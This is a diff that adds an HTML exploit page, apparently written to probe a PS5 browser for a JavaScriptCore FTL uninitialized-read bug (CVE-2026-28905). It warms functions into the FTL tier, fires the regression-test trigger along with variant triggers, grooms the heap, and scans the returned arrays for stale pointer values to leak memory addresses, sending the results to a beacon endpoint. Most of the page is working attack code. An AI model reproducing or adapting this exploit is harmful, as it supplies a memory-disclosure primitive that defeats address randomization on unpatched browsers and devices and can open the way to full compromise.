@@ -1,0 +1,306 @@
+<!--
+  p663: CVE-2026-28905 — FTL PhantomNewArrayWithButterfly uninitialized read
+  Fix: commit 392f508eef, May 2026 (Safari 26.5)
+  PS5 build: Sep 2026 — but cherry-pick cutoff is ~Feb-Mar 2026
+  CVE-2026-84635 (Mar 2026) was NOT patched → this May 2026 fix likely ALSO missing
+
+  The bug: FTL OSR exit materializes PhantomNewArrayWithButterfly.
+  Unwritten slots should be holes but are passed as real values to
+  putDirectIndex → stale butterfly memory readable as JS values.
+
+  If stale memory contains JSC pointers → INFO LEAK → text base.
+
+  Phase A: detect FTL (timing + optimization tier)
+  Phase B: trigger the PoC from the regression test
+  Phase C: scan returned arrays for non-zero/pointer-shaped values
+  Phase D: heap groom + trigger for controlled leak
+
+  CRASH_CLASS: LOW (read-only, no write)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p663</title></head>
+<body>p663: FTL uninit butterfly leak
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function(){
+'use strict';
+var L=document.getElementById('log'),bQ=[];
+function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);if(bQ.length>=3)flush();}
+function flush(){if(!bQ.length)return;var b=bQ.splice(0,4).join('|');try{var x=new XMLHttpRequest();x.open('GET','/beacon/P663-'+encodeURIComponent(b),false);x.send();}catch(e){}}
+window.onerror=function(m){emit('ERR',String(m).slice(0,120));flush();};
+
+var f64=new Float64Array(1),u8=new Uint8Array(f64.buffer),bu64;
+try{bu64=new BigUint64Array(f64.buffer);}catch(e){}
+function d2hex(d){f64[0]=d;var h='';for(var i=7;i>=0;i--)h+=('0'+u8[i].toString(16)).slice(-2);return h;}
+function isPtr(d){if(typeof d!=='number'||d===0||!isFinite(d))return false;f64[0]=d;var hi=(u8[7]<<8)|u8[6];return hi>0&&hi<0x7ff0&&d!==0;}
+
+emit('START','v1 '+navigator.userAgent.slice(0,60));flush();
+
+// ================================================================
+// PHASE A: FTL detection
+// DFG compiles at ~100 invocations, FTL at ~1000-5000
+// Measure performance at different iteration counts
+// ================================================================
+emit('A','ftl-detection');
+try{
+  function tightLoop(n){var s=0;for(var i=0;i<n;i++)s+=i;return s;}
+
+  // Warm DFG
+  for(var i=0;i<200;i++) tightLoop(100);
+
+  // Time at DFG level
+  var t0=Date.now();
+  for(var i=0;i<100;i++) tightLoop(10000);
+  var dfgTime=Date.now()-t0;
+
+  // Now push to FTL (many more iterations)
+  for(var i=0;i<10000;i++) tightLoop(1000);
+
+  // Time at FTL level
+  var t1=Date.now();
+  for(var i=0;i<100;i++) tightLoop(10000);
+  var ftlTime=Date.now()-t1;
+
+  var ratio=dfgTime>0?(ftlTime/dfgTime):0;
+  emit('A-TIME','dfg='+dfgTime+'ms,ftl='+ftlTime+'ms,ratio='+ratio.toFixed(2));
+  if(ftlTime<dfgTime*0.7) emit('A-VERDICT','FTL-LIKELY (speedup after more warmup)');
+  else if(ftlTime<=dfgTime) emit('A-VERDICT','POSSIBLE-FTL (marginal speedup)');
+  else emit('A-VERDICT','DFG-ONLY (no additional speedup)');
+}catch(e){emit('A-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE B: Direct regression test — exact PoC from commit
+// ================================================================
+emit('B','regression-test');
+try{
+  var leakedValues=[];
+
+  function opt() {
+    var arr = [0,0,0,0,0,0,0];
+    function f() {
+      arr[0];
+      (0)[0];  // force OSR exit path
+      return arr;
+    }
+    var ret = arr.map(f);
+    ret[0] = 1;
+    return ret;
+  }
+
+  // Warm to FTL
+  for(var i=0;i<500;i++) opt();
+
+  // Now collect results
+  for(var i=0;i<100;i++){
+    var result=opt();
+    for(var j=0;j<result.length;j++){
+      var v=result[j];
+      if(v!==0 && v!==1 && v!==undefined){
+        leakedValues.push({iter:i,idx:j,val:v,type:typeof v,hex:typeof v==='number'?d2hex(v):'N/A'});
+      }
+    }
+  }
+
+  emit('B-RESULT','leaks='+leakedValues.length+'/700');
+  for(var k=0;k<Math.min(leakedValues.length,8);k++){
+    var lv=leakedValues[k];
+    emit('B-LEAK','i='+lv.iter+',j='+lv.idx+',type='+lv.type+',hex='+lv.hex+',val='+String(lv.val).slice(0,30));
+  }
+  if(leakedValues.length>0) emit('B-VERDICT','UNINIT-READ-CONFIRMED — '+leakedValues.length+' stale values');
+  else emit('B-VERDICT','no-leak (all slots 0 or 1)');
+}catch(e){emit('B-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE C: Higher iteration count + varied array sizes
+// FTL might need more warmup on PS5
+// ================================================================
+emit('C','extended-warmup');
+try{
+  var leaksC=[];
+
+  function opt2() {
+    var arr = [0,0,0,0,0,0,0,0,0,0]; // 10 elements
+    function f() {
+      arr[0];
+      (0)[0];
+      return arr;
+    }
+    var ret = arr.map(f);
+    ret[0] = 1;
+    return ret;
+  }
+
+  // Much more warmup for FTL
+  for(var i=0;i<5000;i++) opt2();
+
+  for(var i=0;i<200;i++){
+    var result=opt2();
+    for(var j=0;j<result.length;j++){
+      var v=result[j];
+      if(v!==0 && v!==1 && v!==undefined){
+        leaksC.push({iter:i,idx:j,val:v,type:typeof v,hex:typeof v==='number'?d2hex(v):'N/A'});
+      }
+    }
+  }
+
+  emit('C-RESULT','leaks='+leaksC.length+'/2000');
+  for(var k=0;k<Math.min(leaksC.length,8);k++){
+    var lv=leaksC[k];
+    emit('C-LEAK','i='+lv.iter+',j='+lv.idx+',type='+lv.type+',hex='+lv.hex);
+  }
+  if(leaksC.length>0) emit('C-VERDICT','LEAK-CONFIRMED');
+  else emit('C-VERDICT','no-leak-extended');
+}catch(e){emit('C-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE D: Heap groom — fill butterfly memory with interesting data
+// then trigger the uninit read to leak it
+// ================================================================
+emit('D','heap-groom-leak');
+try{
+  var leaksD=[];
+
+  // Step 1: create objects to fill butterfly memory with pointers
+  var groomObjects=[];
+  for(var i=0;i<500;i++){
+    var o={a:i,b:{x:1},c:[1,2,3],d:function(){return i;}};
+    groomObjects.push(o);
+  }
+
+  // Step 2: free some to leave stale pointers in freed butterfly slots
+  for(var i=0;i<500;i+=2){
+    groomObjects[i]=null;
+  }
+
+  // Step 3: trigger GC-like pressure
+  var pressure=[];
+  for(var i=0;i<1000;i++) pressure.push([i,i+1,i+2]);
+  pressure=null;
+
+  function opt3() {
+    var arr = [0,0,0,0,0,0,0];
+    function f() {
+      arr[0];
+      (0)[0];
+      return arr;
+    }
+    var ret = arr.map(f);
+    ret[0] = 1;
+    return ret;
+  }
+
+  // Warm and collect
+  for(var i=0;i<3000;i++) opt3();
+
+  for(var i=0;i<500;i++){
+    var result=opt3();
+    for(var j=0;j<result.length;j++){
+      var v=result[j];
+      if(v!==0 && v!==1 && v!==undefined){
+        var entry={iter:i,idx:j,type:typeof v};
+        if(typeof v==='number'){
+          entry.hex=d2hex(v);
+          entry.isPtr=isPtr(v);
+        } else {
+          entry.hex='N/A';
+          entry.str=String(v).slice(0,40);
+        }
+        leaksD.push(entry);
+      }
+    }
+  }
+
+  emit('D-RESULT','leaks='+leaksD.length+'/3500');
+
+  var ptrs=leaksD.filter(function(x){return x.isPtr;});
+  var objs=leaksD.filter(function(x){return x.type==='object';});
+  var strs=leaksD.filter(function(x){return x.type==='string';});
+
+  emit('D-TYPES','ptrs='+ptrs.length+',objs='+objs.length+',strs='+strs.length);
+
+  for(var k=0;k<Math.min(ptrs.length,10);k++){
+    emit('D-PTR','i='+ptrs[k].iter+',j='+ptrs[k].idx+',hex=0x'+ptrs[k].hex);
+  }
+  for(var k=0;k<Math.min(objs.length,5);k++){
+    emit('D-OBJ','i='+objs[k].iter+',j='+objs[k].idx);
+  }
+
+  if(ptrs.length>0) emit('D-VERDICT','POINTER-LEAK — '+ptrs.length+' pointer-shaped values!');
+  else if(leaksD.length>0) emit('D-VERDICT','DATA-LEAK — non-pointer stale data');
+  else emit('D-VERDICT','no-leak-with-groom');
+}catch(e){emit('D-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE E: Alternative trigger — different OSR exit shapes
+// The original uses (0)[0] to force exit. Try other triggers.
+// ================================================================
+emit('E','alt-triggers');
+try{
+  var leaksE=[];
+
+  // Trigger 1: type confusion via argument
+  function opt4(flag) {
+    var arr = [0,0,0,0,0,0,0];
+    function f() {
+      arr[0];
+      if(flag) ({}).noSuchProp;
+      return arr;
+    }
+    var ret = arr.map(f);
+    ret[0] = 1;
+    return ret;
+  }
+
+  // Warm with flag=false
+  for(var i=0;i<3000;i++) opt4(false);
+  // Trigger OSR exit with flag=true
+  for(var i=0;i<100;i++){
+    var result=opt4(true);
+    for(var j=0;j<result.length;j++){
+      var v=result[j];
+      if(v!==0&&v!==1&&v!==undefined)
+        leaksE.push({src:'T1',idx:j,type:typeof v,hex:typeof v==='number'?d2hex(v):'N/A'});
+    }
+  }
+
+  // Trigger 2: exception-based OSR exit
+  function opt5() {
+    var arr = [0,0,0,0,0,0,0];
+    function f() {
+      arr[0];
+      try{undefined.x;}catch(e){}
+      return arr;
+    }
+    var ret = arr.map(f);
+    ret[0] = 1;
+    return ret;
+  }
+  for(var i=0;i<3000;i++) opt5();
+  for(var i=0;i<100;i++){
+    var result=opt5();
+    for(var j=0;j<result.length;j++){
+      var v=result[j];
+      if(v!==0&&v!==1&&v!==undefined)
+        leaksE.push({src:'T2',idx:j,type:typeof v,hex:typeof v==='number'?d2hex(v):'N/A'});
+    }
+  }
+
+  emit('E-RESULT','leaks='+leaksE.length);
+  for(var k=0;k<Math.min(leaksE.length,8);k++){
+    var lv=leaksE[k];
+    emit('E-LEAK',lv.src+',j='+lv.idx+',type='+lv.type+',hex='+lv.hex);
+  }
+  if(leaksE.length>0) emit('E-VERDICT','ALT-TRIGGER-LEAK');
+  else emit('E-VERDICT','no-leak-alt');
+}catch(e){emit('E-ERR',e.name+':'+e.message);}
+flush();
+
+emit('DONE','p663-complete');
+flush();
+})();
+</script>
+</body>
+</html>
